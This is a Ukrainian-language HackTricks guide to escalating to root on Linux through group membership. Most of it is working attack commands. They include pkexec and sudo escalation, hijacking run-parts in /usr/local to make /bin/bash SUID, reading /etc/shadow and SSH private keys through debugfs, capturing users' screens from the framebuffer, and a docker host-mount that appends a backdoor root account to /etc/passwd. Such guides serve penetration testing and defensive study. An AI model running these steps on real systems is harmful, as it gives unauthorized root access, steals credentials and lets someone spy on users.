# Цікаві Групи - Підвищення Привілеїв в Linux

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## Групи Sudo/Admin

### **PE - Метод 1**

**Іноді**, **за замовчуванням (або через необхідність деякого програмного забезпечення)** всередині файлу **/etc/sudoers** ви можете знайти деякі з цих рядків:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи sudo або admin, може виконати будь-що як sudo**.

Якщо це так, **щоб стати root, ви можете просто виконати**:
```
sudo su
```
### PE - Метод 2

Знайдіть всі suid-бінарники та перевірте, чи є серед них бінарний файл **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Якщо ви виявите, що бінарний файл **pkexec є SUID-бінарним** і ви належите до групи **sudo** або **admin**, ви, ймовірно, зможете виконувати бінарні файли як sudo, використовуючи `pkexec`. Це тому, що зазвичай ці групи є в **політиці polkit**. Ця політика визначає, які групи можуть використовувати `pkexec`. Перевірте це за допомогою:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Тут ви знайдете, які групи мають дозвіл на виконання **pkexec** і **за замовчуванням** в деяких дистрибутивах Linux з'являються групи **sudo** та **admin**.

Для **отримання прав root ви можете виконати**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Якщо ви намагаєтеся виконати **pkexec** і отримуєте цю **помилку**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Це не через те, що у вас немає дозволів, а через те, що ви не підключені без GUI**. Існує обхідне рішення для цієї проблеми тут: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібно **2 різні сеанси ssh**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="сесія2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Група Wheel

**Іноді**, **за замовчуванням** всередині файлу **/etc/sudoers** ви можете знайти цей рядок:
```
%wheel	ALL=(ALL:ALL) ALL
```
Це означає, що **будь-який користувач, який належить до групи wheel, може виконати будь-яку команду як sudo**.

Якщо це так, **щоб стати root, ви можете просто виконати**:
```
sudo su
```
## Група Shadow

Користувачі з **групи shadow** можуть **читати** файл **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Отже, прочитайте файл і спробуйте **розшифрувати деякі хеші**.

## Група персоналу

**staff**: Дозволяє користувачам додавати локальні модифікації до системи (`/usr/local`) без необхідності привілеїв root (зверніть увагу, що виконувані файли в `/usr/local/bin` є в змінній PATH будь-якого користувача, і вони можуть "перевизначити" виконувані файли в `/bin` та `/usr/bin` з такою ж назвою). Порівняйте з групою "adm", яка більше пов'язана з моніторингом/безпекою. [\[джерело\]](https://wiki.debian.org/SystemGroups)

У дистрибутивах debian, змінна `$PATH` показує, що `/usr/local/` буде запущено з найвищим пріоритетом, незалежно від того, чи ви привілейований користувач, чи ні.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Якщо ми можемо захопити деякі програми в `/usr/local`, ми легко можемо отримати root.

Захоплення програми `run-parts` - це спосіб легко отримати root, оскільки більшість програм буде запускати `run-parts`, наприклад (crontab, коли відбувається вхід через ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
або Коли нова сесія ssh входить.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Експлойт**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Група диска

Ця привілея майже **еквівалентна доступу root**, оскільки ви можете отримати доступ до всіх даних всередині машини.

Файли: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Зверніть увагу, що за допомогою debugfs ви також можете **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` до `/tmp/asd2.txt`, ви можете виконати:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Однак, якщо ви спробуєте **записувати файли, що належать root** (наприклад, `/etc/shadow` або `/etc/passwd`), ви отримаєте помилку "**Permission denied**".

## Група відео

Використовуючи команду `w`, ви можете дізнатися **хто увійшов в систему**, і вона покаже вивід, схожий на наступний:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** означає, що користувач **yossi увійшов фізично** до терміналу на машині.

Група **video** має доступ до перегляду виводу екрану. В основному, ви можете спостерігати за екранами. Для цього потрібно **захопити поточне зображення на екрані** у вигляді сирої даних та отримати роздільну здатність, яку використовує екран. Дані екрану можна зберегти в `/dev/fb0`, а роздільну здатність цього екрану можна знайти в `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Для **відкриття** **сирого зображення** можна використовувати **GIMP**, виберіть файл \*\*`screen.raw` \*\* та виберіть тип файлу **Raw image data**:

![](<../../../.gitbook/assets/image (463).png>)

Потім змініть ширину та висоту на ті, які використовуються на екрані та перевірте різні типи зображень (і виберіть той, який краще показує екран):

![](<../../../.gitbook/assets/image (317).png>)

## Група Root

Здається, за замовчуванням **члени групи root** можуть мати доступ до **зміни** деяких файлів конфігурації **служб** або деяких файлів **бібліотек** або **інших цікавих речей**, які можуть бути використані для підвищення привілеїв...

**Перевірте, які файли можуть змінювати члени групи root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Група Docker

Ви можете **підключити кореневу файлову систему хост-машини до тома екземпляра**, тому коли екземпляр запускається, він негайно завантажує `chroot` у цей том. Це фактично дає вам root-доступ до машини.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## Група lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Група Adm

Зазвичай **члени** групи **`adm`** мають дозвіл на **читання файлів журналу**, розташованих всередині _/var/log/_.\
Отже, якщо ви скомпрометували користувача в цій групі, вам слід обов'язково **подивитися журнали**.

## Група Auth

У OpenBSD група **auth** зазвичай може записувати в папки _**/etc/skey**_ та _**/var/db/yubikey**_, якщо вони використовуються.\
Ці дозволи можна зловживати за допомогою наступного експлойту для **підвищення привілеїв** до root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
